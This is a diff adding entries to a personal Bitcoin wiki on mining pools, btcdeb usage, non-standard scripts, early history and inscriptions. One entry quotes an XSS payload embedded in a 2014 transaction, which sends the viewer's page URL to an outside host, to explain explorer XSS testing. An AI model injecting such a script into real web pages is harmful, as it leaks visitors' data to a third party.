@@ -44,8 +44,20 @@ Notable ones:
 = Cryptocurrency mining
 {parent=Cryptocurrency}
 
+= Miner
+{disambiguate=cryptocurrency}
+{synonym}
+
+= Mining
+{disambiguate=cryptocurrency}
+{synonym}
+
 = Block reward
 {parent=Cryptocurrency mining}
+
+= Mining reward
+{parent=Cryptocurrency mining}
+{wiki}
 
 = Mining pool
 {parent=Cryptocurrency mining}
@@ -53,6 +65,12 @@ Notable ones:
 
 = Bitcoin mining pool
 {parent=Mining pool}
+
+= AntPool
+{c}
+{parent=Bitcoin mining pool}
+
+https://en.bitcoin.it/wiki/AntPool
 
 = Eligius pool
 {c}
@@ -71,6 +89,16 @@ Eligius also means to "choose" or "chosen" in <Latin>: https://en.wiktionary.org
 {parent=Bitcoin mining pool}
 
 https://www.f2pool.com/
+
+= Horrible Horrendous Terrible Tremendous
+{c}
+{parent=Bitcoin mining pool}
+{title2=2012-2013}
+{title2=HHTT}
+
+http://hhtt.1209k.com/
+
+They might have shut down, but they still have the cutest name! And they've made some cute <inscription (blockchain)>[inscriptions] too, see: <Cool data embedded in the bitcoin blockchain/HHTT>
 
 = Slush Pool
 {c}
@@ -268,8 +296,119 @@ Bibliography:
 {c}
 {parent=How Bitcoin works}
 
+= Bitcoin script debugger
+{parent=Bitcoin script}
+
+= btcdeb
+{parent=Bitcoin script debugger}
+
+https://github.com/bitcoin-core/btcdeb
+
+Tested on <Ubuntu 23.10>:
+``
+sudo apt install libtool
+git clone https://github.com/bitcoin-core/btcdeb
+cd btcdeb
+git patch <EOF
+diff --git a/support/lockedpool.cpp b/support/lockedpool.cpp
+index e48accf..64d0abc 100644
+--- a/support/lockedpool.cpp
++++ b/support/lockedpool.cpp
+@@ -19,6 +19,7 @@
+ #endif
+ 
+ #include <algorithm>
++#include <stdexcept>
+ #ifdef ARENA_DEBUG
+ #include <iomanip>
+ #include <iostream>
+EOF
+./autogen.sh
+./configure
+make -j
+``
+Patch submited at: https://github.com/bitcoin-core/btcdeb/pull/143
+
+Then we use it;
+``
+./btcdeb '[OP_1 OP_2 OP_ADD]'
+``
+and inside the shell:
+``
+btcdeb 5.0.24 -- type `./btcdeb -h` for start up options
+LOG: signing segwit taproot
+notice: btcdeb has gotten quieter; use --verbose if necessary (this message is temporary)
+3 op script loaded. type `help` for usage information
+script  |  stack 
+--------+--------
+1       | 
+2       | 
+OP_ADD  | 
+#0000 1
+btcdeb> step
+                <> PUSH stack 01
+script  |  stack 
+--------+--------
+2       |      01
+OP_ADD  | 
+#0001 2
+btcdeb> step
+                <> PUSH stack 02
+script  |  stack 
+--------+--------
+OP_ADD  |      02
+        |      01
+#0002 OP_ADD
+btcdeb> step
+                <> POP  stack
+                <> POP  stack
+                <> PUSH stack 03
+script  |  stack 
+--------+--------
+        |      03
+btcdeb> step
+script  |  stack 
+--------+--------
+        |      03
+btcdeb> step
+at end of script
+btcdeb>
+``
+
+= Puzzle script
+{parent=Bitcoin script}
+
+= Finding unspent puzzle scripts
+{parent=Puzzle script}
+{title2=2023}
+
+https://github.com/cirosantilli/bitcoin-strings-with-txids?tab=readme-ov-file#utxo_nonstandard
+
+= BSHUNTER: Detecting and Tracing Defects of Bitcoin Scripts
+{parent=Finding unspent puzzle scripts}
+{title2=2023}
+
+https://dl.acm.org/doi/abs/10.1109/ICSE48619.2023.00037
+
+Authors: Peilin Zheng, Xiapu Luo, Zibin Zheng
+
+Epic title.
+
 = Bitcoin script type
 {parent=Bitcoin script}
+
+= Bitcoin transaction type
+{synonym}
+
+= Multisig
+{c}
+{parent=Bitcoin script type}
+
+https://en.bitcoin.it/wiki/Multi-signature
+
+= P2PKH
+{c}
+{parent=Bitcoin script type}
 
 = Bitcoin non-standard transaction
 {c}
@@ -281,6 +420,8 @@ Bibliography:
 * https://bitcoin.stackexchange.com/questions/5883/is-there-a-listing-of-strange-or-unusual-scripts-found-in-transactions/105392#105392
 * https://bitcoin.stackexchange.com/questions/547/useful-alternative-bitcoin-transaction-scripts
 * https://bitcoin.stackexchange.com/questions/35956/non-standard-tx-with-obscure-op-codes-examples/36037#36037 notably provides the amazing https://www.quantabytes.com/articles/a-survey-of-bitcoin-transaction-types
+* https://b10c.me/observations/09-non-standard-transactions/ "An overview of recent non-standard Bitcoin transactions" by 0xB10C (2024-01-29)
+Monday, January 29, 2024
 
 Interesting ones:
 
@@ -289,7 +430,65 @@ Interesting ones:
 https://bitcointalk.org/index.php?topic=5231222.0 duscusses what happens if there is an invalid opcode in a branch that is not taken.
 +
 Discussed at: https://bitcoin.stackexchange.com/questions/35956/non-standard-tx-with-obscure-op-codes-examples
-* 4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af 0 `OP_ADD OP_ADD None OP_EQUAL OP_NOTIF OP_RETURN OP_ENDIF OP_FROMALTSTACK None OP_DROP` is provably unspendable because it always falls on `OP_FROMALTSTACK` but nothing is ever placed in the ALTSTACK
+
+= Peter Todd's hash collision puzzles
+{c}
+{parent=Bitcoin non-standard transaction}
+{title2=2013}
+
+* https://bitcointalk.org/index.php?topic=293382.0
+* https://xiaohuiliu.medium.com/bitcoin-zk-bounty-series-part-2-finding-hash-collisions-5e3aa3eb3925
+* https://bitcoinjs-guide.bitcoin-studio.com/bitcoinjs-guide/v5/part-three-pay-to-script-hash/puzzles/computational_puzzle_sha1_collision_p2sh
+
+= Peter Todd
+{c}
+{parent=Peter Todd's hash collision puzzles}
+
+* https://bitcointalk.org/index.php?action=profile;u=2546
+* https://twitter.com/peterktodd
+* https://github.com/petertodd
+* https://petertodd.org/
+* https://www.reddit.com/user/petertodd/
+
+= Bitcoin script that terminates with multiple values on the stack
+{parent=Bitcoin non-standard transaction}
+
+* https://www.reddit.com/r/Bitcoin/comments/67l7ox/does_the_stack_have_to_only_contain_true/
+* https://github.com/bitcoin/bitcoin/commit/39f0d9686095bce469dbfa52333331a5d15c6545
+
+= Provably unspendable Bitcoin output script
+{parent=Bitcoin non-standard transaction}
+
+= 4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af
+{parent=Provably unspendable Bitcoin output script}
+{title2=2014-06-14}
+
+Output 0 does:
+``
+OP_ADD OP_ADD 13 OP_EQUAL OP_NOTIF OP_RETURN OP_ENDIF OP_FROMALTSTACK <large xss constant> OP_DROP
+``
+where the large constant is an interesting <inscription (blockchain)> to test for the presence of <XSS> attacks on <blockchain explorers>:
+``
+<script type='text/javascript'>document.write('<img src='http://www.trollbot.org/xss-blockchain-detector.php?href=' + location.href + ''>');</script>`
+``
+This is almost spendable with:
+``
+1 OP_TOALTSTACK 10 1 2
+``
+but that fails because the altstack is cleared between the input and the output script, so this output is provably unspendable.
+
+Bibliography:
+* https://www.reddit.com/r/Bitcoin/comments/2c5tdz/found_this_while_crawling_the_metadata/
+* https://bitcointalk.org/index.php?topic=701556.0
+
+= a165c82cf21a6bae54dde98b7e00ab43b695debb59dfe7d279ac0c59d6043e24
+{parent=4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af}
+{title2=2014-06-14}
+
+Sister transaction of <4373b97e4525be4c2f4b491be9f14ac2b106ba521587dad8f134040d16ff73af> with another variant of the <XSS> but without IF and `OP_FROMALTSTACK`, thus making it spendable:
+``
+OP_ADD OP_ADD 13 OP_EQUAL <large xss constant> OP_DROP
+``
 
 = Invalid Bitcoin script
 {c}
@@ -307,6 +506,8 @@ The first invalid script is just e.g. "script":"01", which says will push one by
 = OP_RETURN
 {c}
 {parent=Bitcoin script operator}
+{tag=Bitcoin inscription method}
+{title2=2014}
 
 = Bitcoin input script
 {c}
@@ -329,6 +530,7 @@ The first invalid script is just e.g. "script":"01", which says will push one by
 = Bitcoin mining reward
 {parent=How Bitcoin works}
 {tag=Block reward}
+{tag=Mining reward}
 
 = Bitcoin halvening
 {parent=Bitcoin mining reward}
@@ -347,7 +549,28 @@ Each of these events prompts some commemorative <inscription (blockchain)>[inscr
 
 * 2008-08-18: <bitcoin.org> registered
 * 2008-10-31: first public announcement at https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html by <satoshi@vistomail.com>
-* 2010-07: <Mt. Gox> starts trading <Bitcoin>
+* 2009-01-03: <Genesis block> mined
+* 2009-01-11: <First block not mined by Satoshi>
+* 2009-01-12: <First Bitcoin transactoin>
+* 2010-05-18: the first of <Laszlo's pizzas> at about \$0.0045 / BTC
+* 2010-07-17: first trade happes on <Mt. Gox> at \$0.04951 / BTC: https://cryptopotato.com/10-years-ago-first-bitcoin-trade-on-mt-gox-for-0-05-per-btc/
+* 2014: <OP_RETURN> goes live
+
+= First Bitcoin transactoin
+{parent=History of Bitcoin}
+{tag=Bitcoin transaction}
+{title2=block 170}
+
+= f4184fc596403b9d638783cf57adfe4c75c605f6356fbc91338530e9831e9e16
+{synonym}
+{title2}
+
+MOre precisely we of course mean the first non-<Coinbase transaction> obviously.
+
+* https://www.blockchain.com/explorer/transactions/btc/f4184fc596403b9d638783cf57adfe4c75c605f6356fbc91338530e9831e9e16
+* https://www.blockchain.com/explorer/blocks/btc/170
+
+Using funds from block 9.
 
 = First mentions of bitcoin on
 {parent=History of Bitcoin}
@@ -669,6 +892,21 @@ How Satoshi hid his mining <IP address>:
 <Hal Finney>:
 * Jan 11, 2009 https://twitter.com/halfin/status/1110302988 "Running Bitcoin"
 
+= Satoshi Bitcoin address
+{parent=Satoshi Nakamoto}
+
+= Genesis block output address
+{c}
+{parent=Satoshi Bitcoin address}
+{tag=Bitcoin address}
+
+= 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+{synonym}
+{title2}
+
+* https://www.blockchain.com/explorer/addresses/BTC/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+* https://www.reddit.com/r/Bitcoin/comments/16cpsol/someone_transferred_4_btc_to_satoshi_nakamotos/ "Someone transferred 4 BTC to Satoshi Nakamoto's wallet."
+
 = bitcoin.org
 {c}
 {parent=Satoshi Nakamoto}
@@ -874,9 +1112,13 @@ These are commands that e.g. the <Bitcoin CLI client> can make to the server.
 
 https://bitcoincore.org/en/doc/22.0.0/rpc/rawtransactions/getrawtransaction/
 
-The commands can be briefly listed with:
+The commands can be listed with:
 ``
-bitcoin-core.daemon --help
+bitcoin-core.cli help
+``
+and full help with:
+``
+bitcoin-core.cli help getrawtransaction
 ``
 
 For example. to run the <Bitcoin `getrawtransaction` command>, first in one shell we start <bitcoind>:
@@ -947,8 +1189,20 @@ Further bibliography:
 * https://bitcoin.stackexchange.com/questions/55188/download-single-and-specific-block-for-study-purposes
 * https://www.fiverr.com/usefulshine/embed-your-logo-or-brand-art-on-blockchain user usefulshine from India embeds ASCII art for you into the blockchain starting at 260 dollars! XD
 
-= Blockchain.info
+= Blockchain explorer
 {parent=How to extract data from the Bitcoin blockchain}
+
+= Blockchair
+{parent=Blockchain explorer}
+
+https://blockchair.com/
+
+Very good explorer, you can create several complex queries on it e.g.
+* https://bitcoin.stackexchange.com/questions/121718/fnd-the-most-valuable-transactions-made-to-a-given-address/121719#121719
+* https://bitcoin.stackexchange.com/questions/71019/filter-transactions-by-time-on-a-given-address/121720#121720
+
+= Blockchain.info
+{parent=Blockchain explorer}
 
 TODO who owns it? Are they reliable?
 
@@ -1118,32 +1372,63 @@ As mentioned in bitcoin.it, it functions basically as <cryptocurrency tumbler> i
 
 Example: <cool data embedded in the bitcoin blockchain/image Study Math and Computer Science at Augustana College>.
 
+A quick overview of some developments: https://research.aimultiple.com/ordinal-inscriptions-history/
+
 = Bitcoin miner inscription
 {c}
 {parent=Bitcoin inscription}
 {tag=Miner message}
 
+= Bitcoin transaction
+{c}
+{parent=Bitcoin}
+
+= Bitcoin address
+{c}
+{parent=Bitcoin transaction}
+
+= Coinbase transaction
+{parent=Bitcoin transaction}
+
+The first transaction of each <Bitcoin block> is called the "coinbase transaction", and it is magic as it does not need to point to a previous <output script> and have a valid <input script> as it serves as a <Block reward> for <miner (cryptocurrency)>[miners].
+
+= Coinbase message
+{parent=Coinbase transaction}
+{tag=Bitcoin inscription method}
+{tag=Miner message}
+
+The <input script> of the <Coinbase transaction> can be anything, and this can be used as a <Bitcoin inscription method>.
+
+Notable examples:
+* <Genesis block message>
+* Prayer side of the <Cool data embedded in the Bitcoin blockchain/Prayer wars>
+
 = Bitcoin block
 {c}
 {parent=Bitcoin}
-{title2=2009}
 {wiki}
+
+= List of bitcoin blocks
+{parent=Bitcoin block}
 
 = Genesis block
 {c}
-{parent=Bitcoin block}
-{title2=2009}
+{parent=List of Bitcoin blocks}
+{title2=2009-01-03}
 {wiki}
 
-https://blockchain.info/block-height/0?format=json
+= Bitcoin block 0
+{synonym}
+{title2}
 
-https://en.bitcoin.it/wiki/Genesis_block contains some comments on the data.
+* https://www.blockchain.com/explorer/blocks/btc/0
+* https://blockchain.info/block-height/0?format=json
+* https://en.bitcoin.it/wiki/Genesis_block contains some comments on the data.
 
 = Genesis block message
 {c}
 {parent=Genesis block}
-{tag=Inscription (blockchain)}
-{tag=Miner message}
+{tag=Coinbase message}
 {wiki}
 
 <Inscription (blockchain)> added by <Satoshi Nakamoto> on the <Genesis block> containing:
@@ -1205,6 +1490,17 @@ TODO the `output` of the transaction has a jumbled script, likely just a regular
 {source=https://medium.com/@chain.info1/the-mystery-behind-satoshi-tribute-donations-cf4ce28c56a1}
 
 * https://medium.com/@chain.info1/the-mystery-behind-satoshi-tribute-donations-cf4ce28c56a1 The Mystery Behind "Satoshi Tribute" Donations by Chain.Info (2020)
+
+= First block not mined by Satoshi
+{c}
+{parent=List of Bitcoin blocks}
+{wiki}
+
+= Bitcoin block 78
+{synonym}
+{title2}
+
+https://www.blockchain.com/explorer/blocks/btc/78
 
 = Ethereum
 {c}
